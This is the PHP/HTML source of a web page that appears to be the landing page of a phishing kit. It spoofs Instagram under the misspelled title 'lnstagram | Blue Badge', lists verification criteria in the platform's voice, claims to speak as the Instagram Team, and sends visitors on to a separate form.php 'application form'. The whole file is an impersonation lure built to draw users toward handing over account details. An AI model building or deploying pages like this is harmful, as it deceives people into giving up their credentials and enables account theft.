<?php
if ($_POST) {
	header("location: form.php");
}
?>
<!DOCTYPE html>

<html>
<head>
	<link rel="stylesheet" href="files/style.css" type="text/css" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/xcode.css">
	<link rel="stylesheet" type="text/css" href="css/xcode2.css">
	<link rel="stylesheet" type="text/css" href="css/xcode3.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.hizliresim.com/egpgwd2.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">

	<title>lnstagram | Blue Badge</title>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="files/header.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
	</header><br><br>
<center>
<style>
*{
	transition:0.0s;
}
.a_adaskpd{
      padding:7px 30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#08a0e9;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
	  }
	  button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 18px;
}
.button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
}
.btn {
    cursor: pointer;
    width: 100%;
    padding: 0 8px;
    background: #3897f0;
    border: 1px solid #3897f0;
    color: #fff;
    border-radius: 3px;
    font-weight: 600;
    font-size: 14px;
    height: 34px;
    line-height: 26px;
    outline: 0;
    white-space: nowrap;
}
@media (max-width: 450px) {
    .btn {
        cursor: pointer;
        width: 100%;
        padding: 0 8px;
        background: #3897f0;
        border: 1px solid #3897f0;
        color: #fff;
        border-radius: 3px;
        font-weight: 600;
        font-size: 14px;
        height: 28px;
        line-height: 26px;
        outline: 0;
        white-space: nowrap;
    }
}
</style>
<div class="center" style="background: white; border-radius:4px;">
<br>
<center>
 <div  style="margin-bottom:20px;"></div>
 <h2 class="AjK3K" style="transition:0.0s;text-align:center;font-family: Helvetica, Arial, Sans-Serif; margin: 0 auto 3px;" align="center"><b> What is Verified <br>&nbsp;&nbsp;Blue Badge?&nbsp;<img style="width:18px;" src="https://i.imgyukle.com/2020/02/19/niuzAb.png"></b></h2>
 <div  style="margin-bottom:20px;"></div>
<p style="font-size: 115%;margin-left: 5%;margin-right: 5%;font-family: Helvetica, Arial, Sans-Serif;">


In addition to following Instagram's Terms of Use and Community Guidelines, your account must meet the following criteria:
<br>
<br>
<b>Authenticity:</b> Your account must represent a natural person, registered business or organization.
<br>
<br>
<b>Being unique:</b> Your account must be the unique asset of the person or business it represents. Only one account of a person or business can be verified, language specific accounts are an exception.
<br>
<br>
<b>To be complete:</b> Your account must be public, have a bio, profile photo, and at least one post. Your profile cannot contain "add me" links to other social media services.
<br>
<br>
 Note that if you provide false or misleading information during the verification process, we may remove your verified badge and take further action to delete your account.




</p>
<div  style="margin-bottom:25px;"></div>
<div style="font-family:sans-serif; font-size:14px; color:#999;">
<p class="GusmU  t_gv9    ">As the Instagram Team, we attach great importance to Community guidelines.</p>
<br> 
</div>
<form method="POST">
<span class="button-box">
<button class="btn" type="submit" name="submit">Go to Application Form</button>
 </span>  
<!--<span class="idhGk _1OSdk">
<center><button type="submit"  style="margin-top:6px;width:230px;background: #3897f0; border-color: #3897f0; color: #fff; " class="a_adaskpd">Go to Appeal Form</button></center>-->
</form>
<div  style="margin-bottom:20px;"></div>
</center>
</div>
<br>
<br>

</center>

</body>
</html>